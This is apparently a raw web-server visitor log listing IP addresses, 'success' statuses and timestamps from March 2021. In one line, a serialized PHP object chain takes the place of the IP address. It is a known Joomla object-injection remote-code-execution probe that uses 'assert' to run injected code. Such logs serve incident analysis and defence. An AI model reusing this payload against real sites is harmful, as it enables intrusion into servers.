::1,1614483155144,20:32:35 GMT-0700 (Mountain Standard Time)
::ffff:209.17.96.106,success,1614895860366,22:11:00 GMT+0000 (Coordinated Universal Time)
::ffff:139.255.246.149,success,1614896593370,22:23:13 GMT+0000 (Coordinated Universal Time)
::ffff:190.12.136.32,success,1614897612816,22:40:12 GMT+0000 (Coordinated Universal Time)
::ffff:162.142.125.39,success,1614897966055,22:46:06 GMT+0000 (Coordinated Universal Time)
::ffff:162.142.125.39,success,1614897966928,22:46:06 GMT+0000 (Coordinated Universal Time)
::ffff:198.20.70.114,success,1614899472519,23:11:12 GMT+0000 (Coordinated Universal Time)
::ffff:34.78.227.165,success,1614899478167,23:11:18 GMT+0000 (Coordinated Universal Time)
::ffff:103.5.125.58,success,1614900863384,23:34:23 GMT+0000 (Coordinated Universal Time)
::ffff:209.17.97.2,success,1614901656304,23:47:36 GMT+0000 (Coordinated Universal Time)
::ffff:192.71.12.140,success,1614903549578,00:19:09 GMT+0000 (Coordinated Universal Time)
::ffff:174.195.143.144,success,1614903653097,00:20:53 GMT+0000 (Coordinated Universal Time)
::ffff:189.223.225.50,success,1614903756904,00:22:36 GMT+0000 (Coordinated Universal Time)
::ffff:189.223.225.50,success,1614903757897,00:22:37 GMT+0000 (Coordinated Universal Time)
::ffff:189.223.225.50,success,1614903766569,00:22:46 GMT+0000 (Coordinated Universal Time)
::ffff:189.223.225.50,success,1614903767490,00:22:47 GMT+0000 (Coordinated Universal Time)
::ffff:189.223.225.50,success,1614903768492,00:22:48 GMT+0000 (Coordinated Universal Time)
}__test|O:21:"JDatabaseDriverMysqli":3:{s:2:"fc";O:17:"JSimplepieFactory":0:{}s:21:"\0\0\0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:8:"feed_url";s:56:"die(md5(DIRECTORY_SEPARATOR));JFactory::getConfig();exit";s:19:"cache_name_function";s:6:"assert";s:5:"cache";b:1;s:11:"cache_class";O:20:"JDatabaseDriverMysql":0:{}}i:1;s:4:"init";}}s:13:"\0\0\0connection";b:1;}ðýýý,success,1614903805051,00:23:25 GMT+0000 (Coordinated Universal Time)
::ffff:153.126.180.38,success,1614905663011,00:54:23 GMT+0000 (Coordinated Universal Time)
::ffff:153.126.180.38,success,1614905665814,00:54:25 GMT+0000 (Coordinated Universal Time)
::ffff:45.155.205.225,success,1614906285200,01:04:45 GMT+0000 (Coordinated Universal Time)
::ffff:209.17.96.66,success,1614906285386,01:04:45 GMT+0000 (Coordinated Universal Time)
::ffff:45.155.205.225,success,1614906287420,01:04:47 GMT+0000 (Coordinated Universal Time)
::ffff:45.56.150.57,success,1614906477637,01:07:57 GMT+0000 (Coordinated Universal Time)
::ffff:61.219.11.153,success,1614906896647,01:14:56 GMT+0000 (Coordinated Universal Time)
::ffff:51.15.242.252,success,1614907249035,01:20:49 GMT+0000 (Coordinated Universal Time)
::ffff:51.15.242.252,success,1614907321478,01:22:01 GMT+0000 (Coordinated Universal Time)
::ffff:174.197.0.143,success,1614907332696,01:22:12 GMT+0000 (Coordinated Universal Time)
::ffff:174.197.0.143,success,1614908985722,01:49:45 GMT+0000 (Coordinated Universal Time)
::ffff:174.197.10.217,success,1614913270739,03:01:10 GMT+0000 (Coordinated Universal Time)
::ffff:115.75.244.58,success,1614913302799,03:01:42 GMT+0000 (Coordinated Universal Time)
::ffff:128.14.136.18,success,1614914268555,03:17:48 GMT+0000 (Coordinated Universal Time)
::ffff:129.146.160.67,success,1614915780311,03:43:00 GMT+0000 (Coordinated Universal Time)
::ffff:129.146.160.67,success,1614915781142,03:43:01 GMT+0000 (Coordinated Universal Time)
::ffff:129.146.160.67,success,1614915782077,03:43:02 GMT+0000 (Coordinated Universal Time)
::ffff:185.142.236.43,success,1614916768101,03:59:28 GMT+0000 (Coordinated Universal Time)
::ffff:35.187.190.226,success,1614916781407,03:59:41 GMT+0000 (Coordinated Universal Time)
::ffff:209.17.96.210,success,1614919529240,04:45:29 GMT+0000 (Coordinated Universal Time)
::ffff:45.144.225.116,success,1614923124694,05:45:24 GMT+0000 (Coordinated Universal Time)
::ffff:93.126.62.93,success,1614923296406,05:48:16 GMT+0000 (Coordinated Universal Time)
::ffff:45.56.150.57,success,1614925359309,06:22:39 GMT+0000 (Coordinated Universal Time)
::ffff:45.180.244.144,success,1614926828997,06:47:08 GMT+0000 (Coordinated Universal Time)
::ffff:138.0.227.78,success,1614927154491,06:52:34 GMT+0000 (Coordinated Universal Time)
::ffff:89.248.165.33,success,1614928200871,07:10:00 GMT+0000 (Coordinated Universal Time)
::ffff:181.143.115.146,success,1614928676319,07:17:56 GMT+0000 (Coordinated Universal Time)
::ffff:172.88.195.177,success,1614933037327,08:30:37 GMT+0000 (Coordinated Universal Time)
::ffff:18.236.78.144,success,1614936057578,09:20:57 GMT+0000 (Coordinated Universal Time)
::ffff:72.44.25.124,success,1614936167890,09:22:47 GMT+0000 (Coordinated Universal Time)
::ffff:34.212.20.137,success,1614936841305,09:34:01 GMT+0000 (Coordinated Universal Time)
::ffff:61.219.11.153,success,1614938128984,09:55:28 GMT+0000 (Coordinated Universal Time)
::ffff:139.162.119.197,success,1614942377525,11:06:17 GMT+0000 (Coordinated Universal Time)
::ffff:186.33.126.113,success,1614943877086,11:31:17 GMT+0000 (Coordinated Universal Time)
::ffff:192.35.168.112,success,1614945846630,12:04:06 GMT+0000 (Coordinated Universal Time)
::ffff:61.159.249.197,success,1614946138682,12:08:58 GMT+0000 (Coordinated Universal Time)
undefined,success,1614946140822,12:09:00 GMT+0000 (Coordinated Universal Time)
undefined,success,1614946141477,12:09:01 GMT+0000 (Coordinated Universal Time)
